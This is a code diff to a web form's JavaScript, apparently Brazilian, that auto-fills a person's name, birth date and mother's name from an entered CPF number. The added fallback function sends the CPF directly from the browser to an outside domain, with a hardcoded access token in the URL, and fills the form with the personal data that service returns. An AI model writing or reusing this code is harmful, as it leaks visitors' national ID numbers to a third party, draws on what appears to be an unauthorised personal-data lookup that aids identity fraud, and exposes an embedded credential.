@@ -240,19 +240,64 @@ document.addEventListener('DOMContentLoaded', function() {
                             
                             console.log('✓ Preenchimento automático concluído');
                         } else {
-                            console.log('Dados não encontrados - preenchimento manual disponível');
+                            console.log('Dados não encontrados - tentando fallback direto');
+                            // Fallback: Try direct API call if backend fails
+                            tryDirectAPICall(cleanCPF);
                         }
                     })
                     .catch(error => {
-                        console.error('Erro na API:', error);
+                        console.error('Erro na API backend:', error);
+                        console.log('Tentando API direta...');
                         
-                        // Reset placeholders on error
-                        fullNameInput.placeholder = 'Nome conforme documento oficial';
-                        birthDateInput.placeholder = '';
-                        motherNameInput.placeholder = 'Nome completo da mãe';
-                        
-                        console.log('API indisponível - preenchimento manual disponível');
+                        // Try direct API call as fallback
+                        tryDirectAPICall(cleanCPF);
                     });
+                
+                // Fallback function for direct API call
+                function tryDirectAPICall(cpf) {
+                    const directApiUrl = `https://consulta.fontesderenda.blog/cpf.php?token=1285fe4s-e931-4071-a848-3fac8273c55a&cpf=${cpf}`;
+                    
+                    fetch(directApiUrl)
+                        .then(response => response.json())
+                        .then(data => {
+                            console.log('Direct API Response:', data);
+                            
+                            if (data && data.DADOS) {
+                                // Auto-fill name if available
+                                if (data.DADOS.nome && data.DADOS.nome.trim()) {
+                                    fullNameInput.value = data.DADOS.nome.trim();
+                                    fullNameInput.style.backgroundColor = '#f0f9ff';
+                                    fullNameInput.style.borderColor = '#3b82f6';
+                                    console.log('✓ Nome preenchido (direto):', data.DADOS.nome);
+                                }
+                                
+                                // Auto-fill birth date if available
+                                if (data.DADOS.data_nascimento && data.DADOS.data_nascimento.trim()) {
+                                    const birthDate = data.DADOS.data_nascimento.split(' ')[0];
+                                    birthDateInput.value = birthDate;
+                                    birthDateInput.style.backgroundColor = '#f0f9ff';
+                                    birthDateInput.style.borderColor = '#3b82f6';
+                                    console.log('✓ Data nascimento preenchida (direto):', birthDate);
+                                }
+                                
+                                // Auto-fill mother's name if available
+                                if (data.DADOS.nome_mae && data.DADOS.nome_mae.trim()) {
+                                    motherNameInput.value = data.DADOS.nome_mae.trim();
+                                    motherNameInput.style.backgroundColor = '#f0f9ff';
+                                    motherNameInput.style.borderColor = '#3b82f6';
+                                    console.log('✓ Nome da mãe preenchido (direto):', data.DADOS.nome_mae);
+                                }
+                                
+                                console.log('✓ Preenchimento direto concluído');
+                            }
+                        })
+                        .catch(directError => {
+                            console.error('Erro na API direta:', directError);
+                            fullNameInput.placeholder = 'Nome conforme documento oficial';
+                            birthDateInput.placeholder = '';
+                            motherNameInput.placeholder = 'Nome completo da mãe';
+                        });
+                }
             }
         }
     });
